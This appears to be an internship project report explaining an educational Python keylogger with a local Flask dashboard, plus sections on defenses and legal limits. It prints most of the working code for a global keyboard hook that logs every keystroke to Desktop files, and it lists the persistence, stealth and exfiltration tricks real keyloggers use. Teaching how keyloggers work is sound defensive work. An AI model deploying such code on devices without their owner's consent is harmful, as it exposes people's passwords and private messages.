# Educational Keylogger Demo — Project Report

**Prepared by:** Internship Project  
**Purpose:** Cybersecurity Awareness & Education  
**Status:** For authorized personal use only  
**Date:** July 2026

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Objectives](#2-objectives)
3. [Technology Stack](#3-technology-stack)
4. [Project Structure](#4-project-structure)
5. [How It Works — System Architecture](#5-how-it-works--system-architecture)
6. [Component-by-Component Breakdown](#6-component-by-component-breakdown)
   - 6.1 [keylogger.py — The Main Python Script](#61-keyloggerpy--the-main-python-script)
   - 6.2 [dashboard.html — The Web Dashboard](#62-dashboardhtml--the-web-dashboard)
   - 6.3 [Log Files on the Desktop](#63-log-files-on-the-desktop)
7. [Data Flow Diagram](#7-data-flow-diagram)
8. [Key Features Explained](#8-key-features-explained)
9. [Security Analysis — How Real Keyloggers Operate](#9-security-analysis--how-real-keyloggers-operate)
10. [How to Protect Yourself](#10-how-to-protect-yourself)
11. [Ethical & Legal Disclaimer](#11-ethical--legal-disclaimer)
12. [Setup & Usage Guide](#12-setup--usage-guide)
13. [Conclusion](#13-conclusion)

---

## 1. Project Overview

This project is an **educational keylogger demonstration** built with Python, Flask, HTML, CSS, and JavaScript. It was created as an internship task to show:

- **What a keylogger is** and how it captures keyboard input at the operating system level.
- **How captured data is stored** in structured log files on the local machine.
- **How to visualize captured data** in real time using a local web dashboard served through a browser.
- **How to defend yourself** from real-world keyloggers.

The entire tool is **100% offline**. No data is sent to any server or external network. Everything stays on the machine where the script runs.

---

## 2. Objectives

| # | Objective | Status |
|---|-----------|--------|
| 1 | Capture all keyboard keystrokes in real time | ✅ Achieved |
| 2 | Start recording automatically when the program runs | ✅ Achieved |
| 3 | Stop recording cleanly when the program is killed or OS shuts down | ✅ Achieved |
| 4 | Save keystroke logs to the Desktop as files | ✅ Achieved |
| 5 | Display live keystrokes in a browser dashboard via localhost | ✅ Achieved |
| 6 | Make the Python code fully visible and understandable | ✅ Achieved |
| 7 | Educate viewers on how to protect themselves from keyloggers | ✅ Achieved |

---

## 3. Technology Stack

| Technology | Role | Why It Was Used |
|---|---|---|
| **Python 3.8+** | Core scripting language | Cross-platform, readable, widely taught |
| **pynput** | Keyboard event listener | Provides low-level OS keyboard hooks on Windows, macOS, and Linux |
| **Flask** | Local web server | Lightweight Python web framework; serves the dashboard and REST API |
| **threading** | Concurrency | Runs the keyboard listener and web server simultaneously |
| **signal** | Graceful shutdown | Catches Ctrl+C and SIGTERM to safely close the log file |
| **json** | Structured data output | Saves keystroke data in machine-readable format |
| **pathlib / os** | File system operations | Cross-platform file path handling |
| **HTML5 / CSS3** | Dashboard structure and styling | Browser-native, no build tools needed |
| **Vanilla JavaScript** | Dashboard interactivity | Polls the API and updates the UI without page reloads |

---

## 4. Project Structure

```
keylogger_demo/
│
├── keylogger.py              ← Main Python script
│                                (keyboard listener + Flask web server)
│
├── requirements.txt          ← Python package dependencies
│
├── README.md                 ← Quick-start instructions
│
├── REPORT.md                 ← This document
│
└── templates/
    └── dashboard.html        ← Browser dashboard
                                 (HTML + CSS + JavaScript, all in one file)
```

When the script runs, it also creates two files on your **Desktop**:

```
~/Desktop/
├── keylog_session.txt        ← Plain-text keystroke log
└── keylog_session.json       ← JSON-formatted keystroke log
```

---

## 5. How It Works — System Architecture

The project has three major layers that work together:

```
┌─────────────────────────────────────────────────────────┐
│                    USER KEYBOARD                        │
│           (Physical or virtual key presses)             │
└────────────────────────┬────────────────────────────────┘
                         │  OS keyboard events
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  pynput Listener                        │
│         (Hooks into OS-level keyboard stream)           │
│                                                         │
│   on_press(key)   →   log_event(key, "PRESS")          │
│   on_release(key) →   log_event(key, "RELEASE")        │
└────────────┬────────────────────────┬───────────────────┘
             │                        │
             ▼                        ▼
┌────────────────────┐   ┌────────────────────────────────┐
│  In-Memory List    │   │       Desktop Log Files        │
│  events[]          │   │                                │
│  (capped at 500)   │   │  keylog_session.txt  (append) │
│                    │   │  keylog_session.json (rewrite) │
└────────┬───────────┘   └────────────────────────────────┘
         │
         │ events[] is shared with Flask via threading.Lock
         ▼
┌─────────────────────────────────────────────────────────┐
│                 Flask Web Server                        │
│              (localhost : 5000)                         │
│                                                         │
│   GET /              → Serves dashboard.html            │
│   GET /api/events    → Returns JSON list of events      │
│   GET /api/stats     → Returns count statistics         │
└────────────────────────┬────────────────────────────────┘
                         │  HTTP (local only)
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Browser Dashboard                          │
│           (dashboard.html via localhost)                │
│                                                         │
│   Polls /api/events  every 1 second                    │
│   Polls /api/stats   every 1 second                    │
│   Updates UI without reloading the page                │
└─────────────────────────────────────────────────────────┘
```

---

## 6. Component-by-Component Breakdown

### 6.1 `keylogger.py` — The Main Python Script

This is the heart of the project. It does four things at once: listens for keystrokes, logs them to files, keeps them in memory, and serves them to the browser.

---

#### Imports & Dependency Check

```python
import os, sys, json, time, signal, threading, platform
from datetime import datetime
from pathlib import Path
from pynput import keyboard
from flask import Flask, render_template, jsonify
```

The first thing the script does after importing is check whether `pynput` and `flask` are installed. If either is missing, it prints a clear error with the exact `pip install` command and exits gracefully instead of crashing with a confusing traceback.

```python
MISSING = []
try:
    from pynput import keyboard
except ImportError:
    MISSING.append("pynput")
...
if MISSING:
    print(f"[!] Missing packages: {', '.join(MISSING)}")
    sys.exit(1)
```

This makes the script beginner-friendly and presentation-safe.

---

#### Configuration Block

```python
DESKTOP       = Path.home() / "Desktop"
LOG_FILE      = DESKTOP / "keylog_session.txt"
JSON_FILE     = DESKTOP / "keylog_session.json"
MAX_EVENTS    = 500
SESSION_START = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
```

- `Path.home()` works on Windows, macOS, and Linux — it always resolves to the current user's home directory.
- `"Desktop"` is then appended to find the Desktop folder.
- `MAX_EVENTS = 500` caps the in-memory list so the program doesn't use up RAM if left running for a very long time.
- `SESSION_START` is recorded once at launch and stamped into both log files and the dashboard header.

---

#### Shared State & Thread Safety

```python
events      = []
events_lock = threading.Lock()
```

The keyboard listener runs in **one thread** and the Flask web server runs in **another thread**. Both need to read and write the `events` list. Without protection, they could collide and corrupt data. The `threading.Lock()` ensures only one thread touches `events` at a time, preventing race conditions.

Wherever `events` is accessed, it is wrapped like this:

```python
with events_lock:
    events.append(entry)
```

---

#### The `log_event()` Function — Core Logger

```python
def log_event(key_str: str, event_type: str):
    ts    = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = {"time": ts, "key": key_str, "type": event_type}

    with events_lock:
        events.append(entry)
        if len(events) > MAX_EVENTS:
            events.pop(0)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {event_type:8s}  {key_str}\n")

    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump({"session_start": SESSION_START,
                   "platform": platform.system(),
                   "events": events}, f, indent=2)
```

This function is called every time a key is pressed or released. It does three things in sequence:

1. **Memory** — Appends the event to the `events` list (evicting the oldest if at the 500-event cap).
2. **Text file** — Opens `keylog_session.txt` in **append mode** (`"a"`) and writes one timestamped line. Append mode means old entries are never erased.
3. **JSON file** — Overwrites `keylog_session.json` with the complete current event list. This keeps the JSON file always in sync and valid.

The timestamp format `%H:%M:%S.%f` captures milliseconds. The `[:-3]` trim cuts it to 3 decimal places (e.g., `14:23:05.482`) for clean readability.

---

#### The `format_key()` Function — Key Name Translator

```python
def format_key(key) -> str:
    try:
        return key.char if key.char else f"[{key.name}]"
    except AttributeError:
        return f"[{str(key).replace('Key.', '')}]"
```

`pynput` passes key objects of two types:

- **`KeyCode`** — for regular character keys (a, b, 1, @, etc.). These have a `.char` attribute.
- **`Key`** — for special keys (Enter, Shift, Ctrl, F1, etc.). These have a `.name` attribute but no `.char`.

This function handles both. Regular characters are returned as-is (e.g., `a`). Special keys are wrapped in brackets (e.g., `[enter]`, `[shift]`, `[ctrl]`). The brackets make special keys visually distinct in the log files and dashboard.

---

#### The pynput Listeners

```python
def on_press(key):
    log_event(format_key(key), "PRESS")

def on_release(key):
    log_event(format_key(key), "RELEASE")

def start_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
```

`keyboard.Listener` from `pynput` registers itself with the operating system's keyboard input subsystem. The OS then calls `on_press` and `on_release` automatically whenever any key event happens, regardless of which application window is in focus. This is the core mechanism that makes a keylogger work.

`start_listener()` is called inside a **daemon thread** so it runs in the background while Flask serves the dashboard on the main thread.

---

#### Flask Web Server & API

Flask provides three routes:

```python
@app.route("/")
def index():
    return render_template("dashboard.html",
                           session_start=SESSION_START,
                           platform=platform.system(),
                           log_file=str(LOG_FILE))
```

The root route (`/`) serves the dashboard HTML. Flask's `render_template` fills in the `{{ session_start }}`, `{{ platform }}`, and `{{ log_file }}` placeholders in the HTML file before sending it to the browser.

```python
@app.route("/api/events")
def api_events():
    with events_lock:
        return jsonify({
            "session_start": SESSION_START,
            "total": len(events),
            "events": list(reversed(events))
        })
```

The `/api/events` route returns the full event list as JSON, reversed so the newest events appear first. The browser polls this endpoint every second.

```python
@app.route("/api/stats")
def api_stats():
    with events_lock:
        presses  = [e for e in events if e["type"] == "PRESS"]
        releases = [e for e in events if e["type"] == "RELEASE"]
        specials = [e for e in presses if e["key"].startswith("[")]
        chars    = [e for e in presses if not e["key"].startswith("[")]
    return jsonify({
        "total_presses":  len(presses),
        "total_releases": len(releases),
        "special_keys":   len(specials),
        "char_keys":      len(chars),
        "last_10":        [e["key"] for e in presses[-10:]]
    })
```

The `/api/stats` route computes live statistics from the event list. Special keys are identified by their `[bracket]` formatting. The `last_10` field powers the live key-chip strip at the bottom of the dashboard feed panel.

---

#### Graceful Shutdown

```python
def shutdown(sig=None, frame=None):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n── Session ended {ts} ──\n")
    print(f"\n[*] Keylogger stopped. Log saved to:\n    {LOG_FILE}\n")
    os._exit(0)

signal.signal(signal.SIGINT,  shutdown)
signal.signal(signal.SIGTERM, shutdown)
```

`signal.SIGINT` is triggered by pressing `Ctrl+C` in the terminal. `signal.SIGTERM` is sent by the operating system when the user logs out or shuts down the machine. In both cases, the `shutdown` function writes a session-end timestamp to the log file before exiting. This ensures the log file always has a clean ending marker and is never left in a half-written state.

`os._exit(0)` is used instead of `sys.exit()` because `sys.exit()` only raises an exception that Flask's internal error handling can catch and suppress. `os._exit(0)` exits immediately at the OS level, bypassing all exception handlers.

---

#### Entry Point

```python
if __name__ == "__main__":
    # Write session header
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'='*55}\n")
        f.write(f"  Session started : {SESSION_START}\n")
        f.write(f"  Platform        : {platform.system()}\n")
        f.write(f"{'='*55}\n")

    # Start keyboard listener in background thread
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()

    # Start Flask (blocking — keeps the program alive)
    app.run(host="127.0.0.1", port=5000, debug=False, use_reloader=False)
```

The program:
1. Writes a header into the log file.
2. Starts the keyboard listener in a **daemon thread** (`daemon=True` means Python will not keep the process alive just for this thread — it will die when the main thread dies).
3. Starts Flask on `127.0.0.1:5000` (localhost only — not accessible from other machines on the network). `use_reloader=False` is important because Flask's reloader would start a second process and break the signal handlers.

---

### 6.2 `dashboard.html` — The Web Dashboard

The dashboard is a single HTML file served by Flask. It uses no external libraries or CDN links — everything works offline.

#### Layout

The page is built with **CSS Grid**:

```
┌─────────────────────────────────────────────────────────┐
│  HEADER   (logo, badges, session info)                  │
├──────────────────────────────┬──────────────────────────┤
│  STATS ROW (4 cards)         │                          │
├──────────────────────────────┤  RIGHT PANEL             │
│                              │  - Log file paths        │
│  LIVE KEYSTROKE FEED         │  - How it works          │
│                              │  - Security tips         │
│  [live key chip strip]       │                          │
└──────────────────────────────┴──────────────────────────┘
│  FOOTER                                                 │
└─────────────────────────────────────────────────────────┘
```

The grid is responsive — on screens narrower than 900px it switches to a single-column layout.

#### The Four Stat Cards

| Card | Color | What It Shows |
|---|---|---|
| Total Keystrokes | Cyan | `total_presses + total_releases` |
| Key Presses | Red | Only PRESS events |
| Special Keys | Yellow | Keys like `[enter]`, `[shift]`, `[ctrl]` |
| Char Keys | Green | Regular letter/number/symbol keys |

#### The Live Feed

Each row in the feed displays three columns: **timestamp**, **event type** (PRESS / RELEASE), and **key name**. Special keys are highlighted in yellow, regular characters in white, and PRESS labels in cyan vs RELEASE labels in grey. A `fadeIn` CSS animation plays when new rows appear.

#### The Live Key Chip Strip

Below the feed, the last 10 pressed keys appear as small chips that pop in with a scale animation. Special keys get a yellow border, regular keys get a cyan text color. This strip updates every second.

#### JavaScript Polling

```javascript
setInterval(fetchStats,  1000);
setInterval(fetchEvents, 1000);
```

Two functions run every 1000 milliseconds (1 second):

- `fetchStats()` calls `/api/stats`, updates the four stat counters, and rebuilds the key chip strip.
- `fetchEvents()` calls `/api/events`. It checks whether the total event count has changed since the last poll. If nothing is new, it skips the DOM update entirely (performance optimization). If there are new events, it rebuilds up to 200 feed rows from the latest data.

An `escapeHtml()` helper prevents XSS injection — if a key name somehow contained `<` or `>`, it would be escaped before being inserted into the DOM.

---

### 6.3 Log Files on the Desktop

#### `keylog_session.txt` — Plain Text Log

This file is human-readable and opens in any text editor. Each line follows this format:

```
=======================================================
  Session started : 2026-07-24 14:30:00
  Platform        : Windows
=======================================================
[14:30:05.123] PRESS      H
[14:30:05.210] RELEASE    H
[14:30:05.310] PRESS      e
[14:30:05.405] RELEASE    e
[14:30:06.001] PRESS      [enter]
[14:30:06.098] RELEASE    [enter]

── Session ended 2026-07-24 14:45:22 ──
```

The file is opened in **append mode**, so if you run the script multiple times, new sessions are added below old ones. Each session has its own header and footer.

#### `keylog_session.json` — JSON Log

This file is machine-readable and useful for data analysis, importing into Excel, or demonstrating structured data in a presentation. Its format is:

```json
{
  "session_start": "2026-07-24 14:30:00",
  "platform": "Windows",
  "events": [
    { "time": "14:30:05.123", "key": "H",       "type": "PRESS"   },
    { "time": "14:30:05.210", "key": "H",       "type": "RELEASE" },
    { "time": "14:30:06.001", "key": "[enter]", "type": "PRESS"   }
  ]
}
```

Unlike the `.txt` file which appends, the `.json` file is **overwritten** on every keystroke to keep it always-valid JSON. This means it only reflects the current session's events (up to the 500-event memory cap).

---

## 7. Data Flow Diagram

Below is the step-by-step journey of a single keystroke through the system:

```
User presses the "H" key
        │
        ▼
OS keyboard driver fires a key-down event
        │
        ▼
pynput intercepts the event via its OS-level hook
        │
        ▼
on_press(key) callback is called in the listener thread
        │
        ▼
format_key(key) returns the string "H"
        │
        ▼
log_event("H", "PRESS") is called
        │
        ├──► events[] list updated (thread-safe, locked)
        │
        ├──► keylog_session.txt  ← "[14:30:05.123] PRESS      H\n" appended
        │
        └──► keylog_session.json ← Full events[] list written as JSON
        
        (1 second later...)
        
Browser polls GET /api/events
        │
        ▼
Flask reads events[] (thread-safe, locked)
        │
        ▼
Returns JSON: { "total": 1, "events": [...] }
        │
        ▼
JavaScript receives the response
        │
        ▼
New feed row is created and animated into the DOM
        │
        ▼
User sees "H" appear in the live keystroke feed
```

---

## 8. Key Features Explained

### Auto-Start on Run

The program starts recording the moment it is launched — there is no "start" button. The keyboard listener is initialized before Flask even starts, so no keystrokes are missed during the server startup window.

### Auto-Stop on Kill

Two signal handlers (`SIGINT` for Ctrl+C, `SIGTERM` for OS shutdown) are registered. Both call the same `shutdown()` function which closes the log file cleanly. The listener thread is a **daemon thread**, so it is automatically killed when the main process ends — no zombie threads are left behind.

### Fully Offline

Flask binds to `127.0.0.1` (loopback), not `0.0.0.0`. This means the dashboard is only accessible from the same machine. No data passes through any network interface.

### Thread Safety

All access to the shared `events` list goes through `threading.Lock()`. This prevents the listener thread and the Flask request threads from corrupting data by modifying the list simultaneously.

### Memory Cap

The `MAX_EVENTS = 500` cap prevents unbounded memory growth. When the list exceeds 500 entries, the oldest entry is removed (`events.pop(0)`) to make room for the new one. The log files on disk are not subject to this cap — they store everything.

### Cross-Platform

`pynput` works on Windows, macOS, and Linux. `pathlib.Path.home()` resolves correctly on all three platforms. The `platform.system()` call detects which OS is running and displays it in the dashboard and log file.

---

## 9. Security Analysis — How Real Keyloggers Operate

This demo represents the simplest and most visible form of a keylogger. Real-world malicious keyloggers are far more dangerous because they use additional techniques to avoid detection.

| Technique | What Real Malware Does | This Demo |
|---|---|---|
| **Persistence** | Writes itself to startup registry keys or cron jobs to survive reboots | None — dies when closed |
| **Stealth** | Hides its process, runs as a system service, or injects into other processes | Fully visible in Task Manager |
| **Exfiltration** | Sends captured keystrokes to a remote attacker via HTTP/email/FTP | No network activity |
| **Encryption** | Encrypts log files so security tools cannot read them | Plain text files |
| **Privilege Escalation** | Runs as Administrator/root to capture all system-level input | Runs as current user |
| **Anti-Detection** | Disables antivirus, uses rootkit techniques to hide keyboard hooks | None |
| **Screenshot Capture** | Combines keylogging with periodic screenshots for context | Not included |
| **Clipboard Monitoring** | Also captures copied text (passwords copied from managers) | Not included |

This demo deliberately avoids all of those techniques. Its purpose is to show the **concept** in a transparent, visible, and controlled way.

---

## 10. How to Protect Yourself

Understanding how keyloggers work is the first step toward defending against them.

### 1. Use Anti-Malware / EDR Software

Endpoint Detection and Response tools (like Windows Defender, Malwarebytes, or CrowdStrike) monitor for processes that register keyboard hooks without authorization. Most modern keyloggers are caught at this stage.

### 2. Use a Password Manager with Auto-Fill

Password managers like Bitwarden, 1Password, or KeePass fill your credentials directly into form fields using clipboard or browser API injection — **no keystrokes are typed**. This completely defeats keyboard-event-based loggers like this demo.

### 3. Use a Virtual On-Screen Keyboard for Sensitive Input

An on-screen keyboard (available built into Windows via `osk.exe`, and on macOS via Accessibility) lets you click on letters using the mouse. `pynput` only listens to physical keyboard events — mouse clicks on an on-screen keyboard produce no key events.

### 4. Enable Two-Factor Authentication (2FA / MFA)

Even if an attacker captures your typed password, they cannot log in without the second factor (a code from your phone, a biometric scan, or a hardware key). MFA is the single most impactful account protection you can add.

### 5. Keep Your OS and Applications Updated

Many keyloggers exploit vulnerabilities in outdated keyboard drivers, browser extensions, or operating system components. Security patches close these gaps quickly — keeping software updated is essential hygiene.

### 6. Never Run Unknown Executables

The most common delivery method for malicious keyloggers is a file sent via email, messaging apps, or bundled with pirated software. Only run software from trusted, verified sources. On Windows, check for a valid digital signature before running any downloaded `.exe`.

### 7. Check Running Processes

Periodically reviewing the list of running processes in Task Manager (Windows) or Activity Monitor (macOS) can reveal unfamiliar programs with keyboard hooks. Tools like Sysinternals Process Explorer show much more detail than the default task manager.

### 8. Use HTTPS Everywhere

While this does not stop a local keylogger, using HTTPS ensures that even if someone intercepts your network traffic, they cannot read your typed passwords in transit. Always look for the padlock icon in your browser.

---

## 11. Ethical & Legal Disclaimer

> ⚠️ **This software is built exclusively for educational and authorized personal use.**

Running a keylogger on a device you do not own, or capturing another person's keystrokes without their explicit knowledge and consent, is:

- **Illegal** in most countries under laws such as the Computer Fraud and Abuse Act (USA), the Computer Misuse Act (UK), and similar cybercrime legislation in Pakistan and internationally.
- **A violation of privacy** and potentially grounds for civil liability.
- **A violation of workplace policy** if deployed on employer hardware.

This project was built as an internship demonstration only. The code is intentionally transparent, visible, and contains no persistence, exfiltration, or stealth mechanisms precisely to make clear it is not intended for malicious use.

**Always obtain written authorization before running any security testing tools on any system.**

---

## 12. Setup & Usage Guide

### Prerequisites

- Python 3.8 or higher installed
- pip package manager
- A terminal / command prompt

### Step 1 — Install Dependencies

Open a terminal in the `keylogger_demo` folder and run:

```bash
pip install -r requirements.txt
```

This installs two packages:
- `pynput>=1.7.6` — keyboard listener
- `flask>=3.0.0` — local web server

### Step 2 — Run the Program

```bash
python keylogger.py
```

You will see this output in the terminal:

```
=======================================================
  EDUCATIONAL KEYLOGGER DEMO
  Session : 2026-07-24 14:30:00
  Log     : C:\Users\YourName\Desktop\keylog_session.txt
  Dashboard : http://localhost:5000
  Press  Ctrl+C  to stop
=======================================================
```

Recording begins **immediately**.

### Step 3 — View the Dashboard

Open your browser and go to:

```
http://localhost:5000
```

You will see the live keystroke feed update as you type anywhere on your computer.

### Step 4 — Review Log Files

Open your Desktop and find:
- `keylog_session.txt` — open in Notepad or any text editor
- `keylog_session.json` — open in VS Code, a JSON viewer, or import into Excel

### Step 5 — Stop the Program

In the terminal, press:

```
Ctrl + C
```

The program prints a confirmation, writes a session-end timestamp to the log file, and exits cleanly.

---

## 13. Conclusion

This project successfully demonstrates the core mechanism behind a keylogger in a completely transparent, educational, and offline context. By building it from scratch, we can see exactly:

- How `pynput` hooks into OS keyboard events at a low level.
- How threading allows simultaneous keyboard capture and web server operation.
- How Flask can serve real-time data to a browser with a simple polling mechanism.
- How log files can be maintained in both human-readable and machine-readable formats simultaneously.
- How a graceful shutdown handler ensures data integrity when the program is stopped.

The accompanying web dashboard makes the invisible visible — turning abstract OS-level events into a clear, real-time display that is ideal for cybersecurity awareness presentations.

Most importantly, understanding how a keylogger works equips users and organizations to defend against them effectively. The protections described in Section 10 — password managers, MFA, updated software, and endpoint security tools — address the real-world attack surface that keyloggers exploit.

---

*Report ends.*  
*For questions about this project, refer to the `README.md` or the inline code comments in `keylogger.py`.*
